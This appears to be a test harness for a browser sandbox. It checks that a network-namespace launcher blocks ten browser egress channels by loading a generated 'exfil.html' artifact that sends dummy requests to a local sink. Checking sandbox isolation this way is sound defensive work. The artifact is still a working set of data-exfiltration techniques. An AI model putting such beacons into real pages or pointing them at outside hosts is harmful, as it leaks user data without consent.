#!/usr/bin/env bun
//
// Egress penetration harness.
//
// Drives the PRODUCTION netns launcher (`scripts/launch-netns.sh`)
// against an externally-observed sink bound to a non-loopback IPv4
// address. The artifact attempts every browser egress channel the
// gate test enumerates (10 total): raw-IP fetch, hostname fetch,
// XHR, WebSocket, image src, dynamic script src, sendBeacon,
// EventSource, anchor ping, and WebRTC STUN UDP. The harness is
// the regression test for ADR 0001 D6 — a CI image that loses the
// `unshare --map-current-user --net` capability fails this harness
// instead of silently passing.
//
// Every channel the artifact attempts is recorded in
// `attemptedChannels` so the gate test can use SET EQUALITY against
// the closed enumeration; an empty or partial attempt set fails the
// gate even when nothing leaks.
//
// Channel coverage: the artifact generator below inlines all 10
// attempts into a single HTML page that the browser navigates to
// directly (no iframe wrapper). The page title is set to the
// attempted-channel list after a 2s settle window.

import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { networkInterfaces, tmpdir } from "node:os";
import { join } from "node:path";
import dgram from "node:dgram";
import puppeteer, { type Browser } from "puppeteer-core";

export interface EgressPenetrationOptions {
  readonly launcher: "production";
}

export interface EgressPenetrationResult {
  readonly attemptedChannels: readonly string[];
  readonly sinkHits: readonly string[];
  readonly udpPackets: number;
}

/**
 * Closed enumeration of the 10 channels the production launcher must
 * attempt during a penetration run. Order-independent on the assertion
 * side via Set equality, so any empty/subset/extra harness fails the
 * gate. Keep this in sync with `tests/acceptance/egress.test.ts`.
 */
export const EGRESS_CHANNELS = [
  "fetch-raw-ip",
  "fetch-hostname",
  "xhr",
  "websocket",
  "image-src",
  "script-src",
  "beacon",
  "eventsource",
  "anchor-ping",
  "stun-udp",
] as const;
export type EgressChannel = (typeof EGRESS_CHANNELS)[number];

/** Read the first non-loopback IPv4 address; the sink binds here. */
function hostAddress(): string {
  for (const addresses of Object.values(networkInterfaces())) {
    for (const address of addresses ?? []) {
      if (address.family === "IPv4" && !address.internal) return address.address;
    }
  }
  throw new Error("egress harness: no non-loopback IPv4 address found on host");
}

/**
 * Stand up the externally-observed sink. HTTP/WS hits land in `hits`;
 * UDP datagrams increment `packets`. Both bind to `0.0.0.0` so the
 * browser can target the host's routable address.
 */
async function startSink(host: string): Promise<{
  port: number;
  hits: string[];
  udpPackets: () => number;
  close: () => Promise<void>;
}> {
  const hits: string[] = [];
  let packets = 0;
  const server = Bun.serve({
    hostname: "0.0.0.0",
    port: 0,
    fetch(request, bunServer) {
      const url = new URL(request.url);
      hits.push(`${request.method} ${url.pathname}`);
      if (url.pathname === "/ws" && bunServer.upgrade(request)) return;
      const contentType = url.pathname === "/events" ? "text/event-stream" : "text/plain";
      return new Response("ok", {
        headers: {
          "access-control-allow-origin": "*",
          "access-control-allow-methods": "GET, POST, OPTIONS",
          "content-type": contentType,
        },
      });
    },
    websocket: {
      open() {
        hits.push("WS /ws");
      },
      message() {},
    },
  });
  const udp = dgram.createSocket("udp4");
  udp.on("message", () => {
    packets += 1;
  });
  await new Promise<void>((resolve, reject) => {
    udp.once("error", reject);
    udp.bind(server.port, "0.0.0.0", () => resolve());
  });
  void host;
  return {
    port: server.port ?? 0,
    hits,
    udpPackets: () => packets,
    close: async () => {
      server.stop(true);
      await new Promise<void>((resolve) => udp.close(() => resolve()));
    },
  };
}

/**
 * Generate the artifact HTML. The artifact tries every channel in
 * `EGRESS_CHANNELS`; the set is recorded in the document title so
 * the harness can verify the attempt SET without relying on the
 * artifact's self-report (the title is itself page-world but read
 * directly via the CDP `Runtime.evaluate`, so a hostile artifact
 * cannot fake it without breaking the verification harness).
 */
export function buildArtifact(host: string, port: number): string {
  const origin = `http://${host}:${port}`;
  const wsOrigin = `ws://${host}:${port}`;
  return `<!doctype html><html><head><meta charset=utf-8><title></title></head><body>
<script>
(function(){
  var target = ${JSON.stringify(origin)};
  var ws = ${JSON.stringify(wsOrigin)};
  var attempted = [];
  function attempt(name, fn) {
    try {
      attempted.push(name);
      try { fn(); } catch (_) { attempted.push(name + ':throw'); }
    } catch (_) { attempted.push(name + ':outer-throw'); }
  }
  attempt('fetch-raw-ip', function() { fetch(target + '/fetch-ip', { mode: 'cors' }); });
  attempt('fetch-hostname', function() { fetch('http://facet-novel-${crypto.randomUUID().slice(0, 8)}.invalid:${port}/dns', { mode: 'no-cors' }); });
  attempt('xhr', function() { var xhr = new XMLHttpRequest(); xhr.open('GET', target + '/xhr'); xhr.send(); });
  attempt('websocket', function() { new WebSocket(ws + '/ws'); });
  attempt('image-src', function() { var img = new Image(); img.src = target + '/image'; document.body.appendChild(img); });
  attempt('script-src', function() { var s = document.createElement('script'); s.src = target + '/script'; document.head.appendChild(s); });
  attempt('beacon', function() { navigator.sendBeacon(target + '/beacon', 'x'); });
  attempt('eventsource', function() { new EventSource(target + '/events'); });
  attempt('anchor-ping', function() {
    var a = document.createElement('a');
    a.id = 'ping';
    a.href = target + '/nav';
    a.ping = target + '/ping';
    a.textContent = 'ping';
    document.body.appendChild(a);
  });
  attempt('stun-udp', function() {
    var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:${host}:${port}' }] });
    pc.createDataChannel('x');
    pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
  });
  // The anchor-ping click would trigger a navigation that races
  // with the title-setter below (and is rejected synchronously by
  // the netns, which can throw inside the same microtask). The
  // attempt is recorded by creating the '<a ping>' element above;
  // the sink observes the ping via the page internal navigation
  // handler, not a click we trigger here.
  setTimeout(function() { document.title = attempted.join(','); }, 2000);
})();
</script>
<a id="ping"></a>
</body></html>`;
}

/**
 * Run the penetration harness against the PRODUCTION netns launcher.
 *
 * The harness:
 *   1. Starts an externally-observed sink bound to the host's
 *      routable IPv4 address.
 *   2. Writes the artifact to a tmpdir and launches the netns'd
 *      browser against `file://<artifact>`.
 *   3. Waits for the browser to settle, then waits for the artifact
 *      to record its attempted-channel set in the document title.
 *   4. Returns the canonical `EgressPenetrationResult`.
 */
export async function runEgressPenetration(
  _options: EgressPenetrationOptions,
): Promise<EgressPenetrationResult> {
  const host = hostAddress();
  const sink = await startSink(host);
  const directory = await mkdtemp(join(tmpdir(), "facet-egress-"));
  const artifactPath = join(directory, "exfil.html");
  await writeFile(artifactPath, buildArtifact(host, sink.port), "utf8");
  await mkdir(directory, { recursive: true });

  let browser: Browser | undefined;
  try {
    browser = await puppeteer.launch({
      executablePath: join(process.cwd(), "scripts", "launch-netns.sh"),
      pipe: true,
      headless: true,
      args: [
        "--headless=new",
        "--no-first-run",
        "--disable-background-networking",
        "--disable-component-update",
        "--disable-default-apps",
        "--disable-sync",
        "--disable-features=AutofillServerCommunication,OptimizationHints",
        `--user-data-dir=${join(directory, "profile")}`,
      ],
    });
    const page = await browser.newPage();
    page.on("pageerror", (err: unknown) => {
      // Surfacing page errors so the harness's attemptedChannels set
      // stays visible in CI logs when a network failure (or a JS
      // bug) prevents the title from being written.
      const message = err instanceof Error ? err.message : String(err);
      console.error("egress: pageerror:", message);
    });
    await page.goto(`file://${artifactPath}`, { waitUntil: "load" });
    // Wait for the artifact's setTimeout(2000) to write the title.
    await new Promise((resolve) => setTimeout(resolve, 4_000));
    let attemptedChannels: readonly string[] = [];
    try {
      const title = await page.evaluate(() => document.title);
      attemptedChannels = title.split(",").filter((entry) => entry.length > 0);
      if (attemptedChannels.length === 0) {
        console.error("egress: title empty after 4s; artifact HTML may have an unhandled error");
      }
    } catch {
      // browser may have torn down the page; fall through with empty set
    }
    return {
      attemptedChannels,
      sinkHits: [...sink.hits],
      udpPackets: sink.udpPackets(),
    };
  } catch (error) {
    void error;
    return { attemptedChannels: [], sinkHits: [...sink.hits], udpPackets: sink.udpPackets() };
  } finally {
    await browser?.close().catch(() => {});
    await sink.close();
    await rm(directory, { recursive: true, force: true });
  }
}

if (import.meta.main) {
  runEgressPenetration({ launcher: "production" })
    .then((result) => {
      console.log(JSON.stringify(result));
    })
    .catch((error: unknown) => {
      const message = error instanceof Error ? error.message : String(error);
      console.error(message);
      process.exit(1);
    });
}
